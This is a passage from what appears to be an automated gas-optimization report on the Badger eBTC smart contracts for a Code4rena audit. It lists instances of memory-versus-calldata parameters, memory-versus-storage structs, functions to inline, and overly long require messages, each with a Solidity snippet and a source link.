[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L602](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L602)


#

```
File: contracts/PriceFeed.sol

794    uint256 _decimalDenominator = _stEthEthDecimals > _ethBtcDecimals
795                ? _stEthEthDecimals
796                : _ethBtcDecimals
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L794-L796](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L794-L796)


#

```
File: contracts/PriceFeed.sol

797    uint256 _scaledDecimal = _stEthEthDecimals > _ethBtcDecimals
798                ? 10 ** (_stEthEthDecimals - _ethBtcDecimals)
799                : 10 ** (_ethBtcDecimals - _stEthEthDecimals)
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L797-L799](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L797-L799)


</details>

# 


## [G-19] Inefficient Parameter Storage
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 1750

### Description
When passing function parameters, using the `calldata` area instead of `memory` can improve gas efficiency. Calldata is a read-only area where function arguments and external function calls' parameters are stored.

By using `calldata` for function parameters, you avoid unnecessary gas costs associated with copying data from `calldata` to memory. This is particularly beneficial when the parameter is read-only and doesn't require modification within the contract.

Using `calldata` for function parameters can help optimize gas usage, especially when making external function calls or when the parameter values are provided externally and don't need to be stored persistently within the contract.

<details>

<summary>
There are 35 instances of this issue:

</summary>

###
#

```
File: contracts/BorrowerOperations.sol

760    MoveTokensParams memory _varMvTokens
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L760](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L760)


#

```
File: contracts/BorrowerOperations.sol

987    AdjustCdpLocals memory vars
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L987](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L987)


#

```
File: contracts/CdpManager.sol

126    bytes32[] memory _cdpArray
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L126](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L126)


#

```
File: contracts/CdpManager.sol

136    SingleRedemptionInputs memory _redeemColFromCdp
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L136](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L136)


#

```
File: contracts/Governor.sol

120    uint8[] memory roleIds
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L120](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L120)


#

```
File: contracts/Interfaces/ISortedCdps.sol

16    bytes32[] memory _ids
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ISortedCdps.sol#L16](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ISortedCdps.sol#L16)


#

```
File: contracts/LeverageMacroBase.sol

244    CheckValueAndType memory check
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L244](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L244)


#

```
File: contracts/LeverageMacroBase.sol

291    LeverageMacroOperation memory operation
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L291](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L291)


#

```
File: contracts/LeverageMacroBase.sol

382    SwapOperation[] memory swapData
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L382](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L382)


#

```
File: contracts/LeverageMacroBase.sol

398    SwapOperation memory swapData
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L398](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L398)


#

```
File: contracts/LeverageMacroBase.sol

435    SwapCheck[] memory swapChecks
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L435](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L435)


#

```
File: contracts/LiquidationLibrary.sol

398    LiquidationLocals memory _partialState
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L398](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L398)


#

```
File: contracts/LiquidationLibrary.sol

467    LiquidationLocals memory _partialState
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L467](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L467)


#

```
File: contracts/LiquidationLibrary.sol

611    LocalVariables_LiquidationSequence memory vars
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L611](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L611)


#

```
File: contracts/LiquidationLibrary.sol

646    LocalVariables_LiquidationSequence memory vars
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L646](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L646)


#

```
File: contracts/LiquidationLibrary.sol

679    bytes32[] memory _cdpArray
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L679](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L679)


#

```
File: contracts/LiquidationLibrary.sol

737    bytes32[] memory _cdpArray
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L737](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L737)


#

```
File: contracts/LiquidationLibrary.sol

810    bytes32[] memory _cdpArray
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L810](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L810)


#

```
File: contracts/LiquidationLibrary.sol

840    LiquidationTotals memory oldTotals
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L840](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L840)


#

```
File: contracts/LiquidationLibrary.sol

841    LiquidationValues memory singleLiquidation
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L841](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L841)


#

```
File: contracts/PriceFeed.sol

401    ChainlinkResponse memory _currentResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L401](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L401)


#

```
File: contracts/PriceFeed.sol

402    ChainlinkResponse memory _prevResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L402](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L402)


#

```
File: contracts/PriceFeed.sol

412    ChainlinkResponse memory _response
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L412](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L412)


#

```
File: contracts/PriceFeed.sol

435    ChainlinkResponse memory _response
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L435](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L435)


#

```
File: contracts/PriceFeed.sol

446    ChainlinkResponse memory _currentResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L446](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L446)


#

```
File: contracts/PriceFeed.sol

447    ChainlinkResponse memory _prevResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L447](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L447)


#

```
File: contracts/PriceFeed.sol

465    FallbackResponse memory _response
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L465](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L465)


#

```
File: contracts/PriceFeed.sol

486    FallbackResponse memory _fallbackResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L486](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L486)


#

```
File: contracts/PriceFeed.sol

504    ChainlinkResponse memory _chainlinkResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L504](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L504)


#

```
File: contracts/PriceFeed.sol

505    ChainlinkResponse memory _prevChainlinkResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L505](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L505)


#

```
File: contracts/PriceFeed.sol

506    FallbackResponse memory _fallbackResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L506](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L506)


#

```
File: contracts/PriceFeed.sol

527    ChainlinkResponse memory _chainlinkResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L527](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L527)


#

```
File: contracts/PriceFeed.sol

528    FallbackResponse memory _fallbackResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L528](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L528)


#

```
File: contracts/PriceFeed.sol

562    FallbackResponse memory _fallbackResponse
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L562](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L562)


#

```
File: contracts/SortedCdps.sol

419    bytes32[] memory _ids
```
 should be declared as `calldata` instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L419](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L419)


</details>

# 


## [G-20] Using Storage Instead of Memory for structs/arrays Saves Gas
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 29400

### Description
When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct / array to be read from storage. This incurs a Gcoldsload (2100 gas) for each field of the struct / array. If the fields are read from the new memory variable, they incur an additional MLOAD, which is more expensive than a simple stack read.

Instead of declaring the variable with the memory keyword, a more cost-effective approach is to declare the variable with the storage keyword. In this case, you can cache any fields that need to be re-read in stack variables. This approach significantly reduces gas costs, as you only incur the Gcoldsload for the fields actually read.

The only scenario where it makes sense to read the whole struct / array into a memory variable is if the full struct / array is being returned by the function or passed to a function that requires memory. Additionally, if the array / struct is being read from another memory array / struct, using a memory variable may be appropriate.

By carefully considering the storage and memory usage in your contract, you can optimize gas costs and improve the efficiency of your smart contract operations.

<details>

<summary>
There are 7 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

150    CdpDebtAndCollShares memory _oldDebtAndColl = CdpDebtAndCollShares(
151                Cdps[_redeemColFromCdp.cdpId].debt,
152                Cdps[_redeemColFromCdp.cdpId].coll
153            )
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L150-L153](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L150-L153)


#

```
File: contracts/Governor.sol

56    address[] memory _usrs = users.values()
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L56)


#

```
File: contracts/Governor.sol

134    bytes32[] memory _sigs = enabledFunctionSigsByTarget[_target].values()
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L134](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L134)


#

```
File: contracts/LeverageMacroBase.sol

176    ICdpManagerData.Cdp memory cdpInfo = cdpManager.Cdps(cdpId)
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L176](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L176)


#

```
File: contracts/LeverageMacroBase.sol

187    ICdpManagerData.Cdp memory cdpInfo = cdpManager.Cdps(checkParams.cdpId)
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L187](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L187)


#

```
File: contracts/LeverageMacroBase.sol

199    ICdpManagerData.Cdp memory cdpInfo = cdpManager.Cdps(checkParams.cdpId)
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L199](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L199)


#

```
File: contracts/SortedCdps.sol

522    Node memory _node = data.nodes[_id]
```
 should be declared as `storage` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L522](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L522)


</details>

# 


## [G-21] Internal or Private Function that Called Once Should Be Inlined to Save Gas
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 380

### Description
Setting the internal/private function that called once to inline would save gas

<details>

<summary>
There are 19 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

648    function _requireCdpIsActive(bytes32 _cdpId) internal view 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L648-L650](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L648-L650)


#

```
File: contracts/CdpManagerStorage.sol

733    function _getSyncedDebtAndCollShares(
734            bytes32 _cdpId
735        ) internal view returns (CdpDebtAndCollShares memory) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L733-L738](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L733-L738)


#

```
File: contracts/EBTCToken.sol

306    function _requireCallerIsBorrowerOperations() internal view 
```
 this function can be delete, the function is never called:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L306-L311](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L306-L311)


#

```
File: contracts/EBTCToken.sol

323    function _requireCallerIsCdpM() internal view 
```
 this function can be delete, the function is never called:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L323-L325](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L323-L325)


#

```
File: contracts/HintHelpers.sol

133    function _calculateCdpStateAfterPartialRedemption(
134            LocalVariables_getRedemptionHints memory vars,
135            uint256 currentCdpDebt,
136            uint256 _price
137        ) internal view returns (uint256, uint256) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L133-L153](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L133-L153)


#

```
File: contracts/LiquidationLibrary.sol

135    function _liquidateIndividualCdpSetupCDP(
136            LiquidationLocals memory _liqState,
137            LiquidationRecoveryModeLocals memory _recoveryState
138        ) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L135-L182](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L135-L182)


#

```
File: contracts/LiquidationLibrary.sol

397    function _liquidateCDPPartially(
398            LiquidationLocals memory _partialState
399        ) private returns (uint256, uint256) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L397-L448](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L397-L448)


#

```
File: contracts/LiquidationLibrary.sol

450    function _partiallyReduceCdpDebt(
451            bytes32 _cdpId,
452            uint256 _partialDebt,
453            uint256 _partialColl
454        ) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L450-L463](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L450-L463)


#

```
File: contracts/LiquidationLibrary.sol

466    function _reInsertPartialLiquidation(
467            LiquidationLocals memory _partialState,
468            uint256 _newNICR,
469            uint256 _oldDebt,
470            uint256 _oldColl
471        ) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L466-L501](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L466-L501)


#

```
File: contracts/LiquidationLibrary.sol

544    function _calculatePartialLiquidationSurplusAndCap(
545            uint256 _ICR,
546            uint256 _price,
547            uint256 _totalDebtToBurn,
548            uint256 _totalColToSend
549        ) private view returns (uint256 toLiquidator, uint256 collSurplus, uint256 debtToRedistribute) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L544-L568](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L544-L568)


#

```
File: contracts/LiquidationLibrary.sol

642    function _getLiquidationValuesRecoveryMode(
643            uint256 _price,
644            uint256 _systemDebt,
645            uint256 _systemCollShares,
646            LocalVariables_LiquidationSequence memory vars,
647            LiquidationValues memory singleLiquidation
648        ) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L642-L671](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L642-L671)


#

```
File: contracts/LiquidationLibrary.sol

733    function _getTotalFromBatchLiquidate_RecoveryMode(
734            uint256 _price,
735            uint256 _systemCollShares,
736            uint256 _systemDebt,
737            bytes32[] memory _cdpArray
738        ) internal returns (LiquidationTotals memory totals) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L733-L805](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L733-L805)


#

```
File: contracts/LiquidationLibrary.sol

807    function _getTotalsFromBatchLiquidate_NormalMode(
808            uint256 _price,
809            uint256 _TCR,
810            bytes32[] memory _cdpArray
811        ) internal returns (LiquidationTotals memory totals) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L807-L835](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L807-L835)


#

```
File: contracts/LiquidationLibrary.sol

862    function _redistributeDebt(uint256 _debt) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L862-L892](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L862-L892)


#

```
File: contracts/LiquidationLibrary.sol

896    function _requirePartialLiqDebtSize(
897            uint256 _partialDebt,
898            uint256 _entireDebt,
899            uint256 _price
900        ) internal view 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L896-L906](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L896-L906)


#

```
File: contracts/LiquidationLibrary.sol

908    function _requirePartialLiqCollSize(uint256 _entireColl) internal pure 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L908-L913](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L908-L913)


#

```
File: contracts/SimplifiedDiamondLike.sol

134    function _executeOne(Operation calldata op) internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L134-L156](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L134-L156)


#

```
File: contracts/SimplifiedDiamondLike.sol

174    function _fallback() internal 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L174-L201](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L174-L201)


#

```
File: contracts/SortedCdps.sol

642    function _ascendList(uint256 _NICR, bytes32 _startId) internal view returns (bytes32, bytes32) 
```
 should be inline to save gas:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L642-L658](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L642-L658)


</details>

# 


## [G-22] Inefficient Gas Usage in Solidity Smart Contracts Due to Long Error Messages
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 1998

### Description
If the string parameter of a require() or revert() function is longer than 32 bytes, it can lead to inefficiencies. This is because each extra memory word of bytes past the original 32 incurs an MSTORE operation, which costs 3 gas.

<details>

<summary>
There are 111 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

137    require(cachedSystemCollShares >= _shares, "ActivePool: Insufficient collateral shares")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L137)


#

```
File: contracts/ActivePool.sol

162    require(cachedSystemCollShares >= _shares, "ActivePool: Insufficient collateral shares")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L162](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L162)


#

```
File: contracts/ActivePool.sol

220    require(
221                msg.sender == borrowerOperationsAddress,
222                "ActivePool: Caller is not BorrowerOperations"
223            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L220-L223](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L220-L223)


#

```
File: contracts/ActivePool.sol

228    require(
229                msg.sender == borrowerOperationsAddress || msg.sender == cdpManagerAddress,
230                "ActivePool: Caller is neither BorrowerOperations nor CdpManager"
231            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L228-L231](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L228-L231)


#

```
File: contracts/ActivePool.sol

236    require(msg.sender == cdpManagerAddress, "ActivePool: Caller is not CdpManager")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L236](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L236)


#

```
File: contracts/ActivePool.sol

277    require(
278                receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_SUCCESS_VALUE,
279                "ActivePool: IERC3156: Callback failed"
280            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L277-L280](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L277-L280)


#

```
File: contracts/ActivePool.sol

302    require(
303                collateral.getPooledEthByShares(DECIMAL_PRECISION) == oldRate,
304                "ActivePool: Should keep same collateral share rate"
305            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L302-L305](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L302-L305)


#

```
File: contracts/ActivePool.sol

350    require(
351                cachedFeeRecipientCollShares >= _shares,
352                "ActivePool: Insufficient fee recipient coll"
353            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L350-L353](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L350-L353)


#

```
File: contracts/ActivePool.sol

374    require(token != address(collateral), "ActivePool: Cannot Sweep Collateral")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374)


#

```
File: contracts/ActivePool.sol

377    require(amount <= balance, "ActivePool: Attempt to sweep more than balance")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L377](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L377)


#

```
File: contracts/ActivePool.sol

393    require(
394                _feeRecipientAddress != address(0),
395                "ActivePool: Cannot set fee recipient to zero address"
396            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396)


#

```
File: contracts/ActivePool.sol

407    require(_newFee <= MAX_FEE_BPS, "ERC3156FlashLender: _newFee should <= MAX_FEE_BPS")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407)


#

```
File: contracts/BorrowerOperations.sol

368    require(
369                _stEthBalanceDecrease <= _cdpStEthBalance,
370                "BorrowerOperations: Cannot withdraw greater stEthBalance than the value in Cdp"
371            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L368-L371](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L368-L371)


#

```
File: contracts/BorrowerOperations.sol

